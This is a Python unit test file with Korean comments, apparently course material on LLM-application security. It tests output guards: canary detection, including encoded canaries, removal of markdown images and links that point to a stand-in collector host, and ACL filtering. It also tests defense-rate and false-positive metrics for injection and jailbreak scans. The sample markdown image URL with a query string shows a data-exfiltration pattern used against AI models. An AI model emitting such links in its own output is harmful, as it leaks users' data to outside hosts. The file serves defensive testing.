"""6-4 / 6-5 방어·측정 단위 테스트 (표준 라이브러리만 사용, 모델 호출 없음)

실행:  python -m unittest -v <일차폴더>/src/test_defense.py

범위
- 6-4 : 데이터 유출을 "막는" 방어 모듈(카나리 탐지, 출력 URL 허용 목록, 문서 단위 ACL)
- 6-5 : 자동 스캔 결과를 집계하는 지표(방어율, 오탐률, 유형별 방어율)

방어 모듈은 output_guard.py(출력 방어), 지표는 metrics.py 에 있다. 입력 방어는 test_input_guard.py 가 따로 본다.
LangChain(ACL 검색기, 모델 -> 방어 체인)과 LangGraph(평가 그래프, 합격/불합격 게이트) 적용은
실제 로컬 모델(Ollama)을 쓰는 모델 테스트 파일(각 code-map.svg 참조)에서 다룬다.

공격 페이로드는 만들지 않는다. 테스트 입력은 방어 모듈이 걸러내야 하는
"출력 문자열" 예시와 더미 데이터뿐이며, 도메인은 예약 TLD(.invalid)를 쓴다.
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))   # 어느 폴더에서 실행해도 같은 폴더의 모듈을 찾는다

import base64
import unittest
from urllib.parse import quote

from output_guard import contains_canary, filter_by_acl, guard_response, sanitize_markdown
from metrics import defense_rate, defense_rate_by_category, false_positive_rate


# ---------------------------------------------------------------------------
# 테스트
# ---------------------------------------------------------------------------

CANARY = "CANARY-7f3a91"                     # 더미 민감 데이터에 심어 두는 식별 문자열
ALLOWED = {"docs.example.com"}               # 렌더링을 허용하는 도메인


class TestCh04Defense(unittest.TestCase):
    """6-4: 유출 방어 모듈 테스트"""

    def test_canary_plain(self):
        # 평문 카나리가 응답에 포함되면 탐지되어야 한다.
        self.assertTrue(contains_canary(f"내부 코드는 {CANARY} 입니다", [CANARY]))

    def test_canary_encoded(self):
        # Base64 / URL 인코딩으로 숨겨도 탐지되어야 한다(은닉 유출 대비).
        b64 = base64.b64encode(CANARY.encode()).decode()
        self.assertTrue(contains_canary(f"data={b64}", [CANARY]))
        self.assertTrue(contains_canary("q=" + quote(CANARY, safe=""), [CANARY]))

    def test_canary_absent(self):
        # 카나리가 없는 정상 응답은 오탐되면 안 된다.
        self.assertFalse(contains_canary("오늘 날씨가 좋습니다", [CANARY]))

    def test_external_image_removed(self):
        # 허용 목록 밖 이미지는 렌더링 즉시 외부 요청이 발생하므로 제거되어야 한다.
        out = sanitize_markdown("![x](https://collector.invalid/p.png?q=abc)", ALLOWED)
        self.assertNotIn("collector.invalid", out)
        self.assertIn("외부 이미지 제거됨", out)

    def test_external_link_removed(self):
        out = sanitize_markdown("[자료](https://collector.invalid/a)", ALLOWED)
        self.assertNotIn("collector.invalid", out)

    def test_allowed_host_kept(self):
        # 허용된 도메인의 이미지/링크는 그대로 유지되어야 한다(오탐 방지).
        src = "![ok](https://docs.example.com/a.png) [문서](https://docs.example.com/b)"
        self.assertEqual(sanitize_markdown(src, ALLOWED), src)

    def test_acl_filters_documents(self):
        # 사용자 그룹과 겹치지 않는 문서는 검색 결과에서 제외되어야 한다.
        docs = [
            {"id": 1, "groups": ["hr"]},
            {"id": 2, "groups": ["dev", "hr"]},
            {"id": 3, "groups": ["finance"]},
        ]
        self.assertEqual([d["id"] for d in filter_by_acl(docs, ["dev"])], [2])
        self.assertEqual(filter_by_acl(docs, []), [])        # 그룹이 없으면 아무것도 못 본다

    def test_pipeline_blocks_canary_and_cleans_url(self):
        # 통합: 카나리 포함 응답은 차단, 외부 이미지만 있는 응답은 URL 제거 후 통과.
        _, blocked = guard_response(f"값: {CANARY}", [CANARY], ALLOWED)
        self.assertTrue(blocked)
        text, blocked = guard_response("![x](https://collector.invalid/p.png)", [CANARY], ALLOWED)
        self.assertFalse(blocked)
        self.assertNotIn("collector.invalid", text)


class TestCh05Metrics(unittest.TestCase):
    """6-5: 스캔 결과 집계 지표 테스트 (공격 200건 중 170건 차단, 정상 100건 중 8건 오차단)"""

    @staticmethod
    def _results():
        r = []
        # 공격: 인젝션 100건(95 차단), 탈옥 100건(75 차단)
        r += [{"category": "injection", "is_attack": True, "blocked": i < 95} for i in range(100)]
        r += [{"category": "jailbreak", "is_attack": True, "blocked": i < 75} for i in range(100)]
        # 정상: 100건 중 8건 오차단
        r += [{"category": "benign", "is_attack": False, "blocked": i < 8} for i in range(100)]
        return r

    def test_defense_rate(self):
        self.assertAlmostEqual(defense_rate(self._results()), 170 / 200)   # 0.85

    def test_false_positive_rate(self):
        self.assertAlmostEqual(false_positive_rate(self._results()), 8 / 100)  # 0.08

    def test_asr_is_complement(self):
        # 공격 성공률(ASR) = 1 - 방어율
        self.assertAlmostEqual(1 - defense_rate(self._results()), 30 / 200)

    def test_by_category_reveals_weak_spot(self):
        # 평균(0.85)에 가려진 취약 유형(탈옥 0.75)이 드러나야 한다.
        by = defense_rate_by_category(self._results())
        self.assertAlmostEqual(by["injection"], 0.95)
        self.assertAlmostEqual(by["jailbreak"], 0.75)
        self.assertNotIn("benign", by)

    def test_empty_inputs_raise(self):
        # 분모가 0이 되는 입력은 조용히 넘기지 않고 오류로 알린다.
        with self.assertRaises(ValueError):
            defense_rate([{"category": "benign", "is_attack": False, "blocked": False}])
        with self.assertRaises(ValueError):
            false_positive_rate([{"category": "x", "is_attack": True, "blocked": True}])


if __name__ == "__main__":
    unittest.main(verbosity=2)
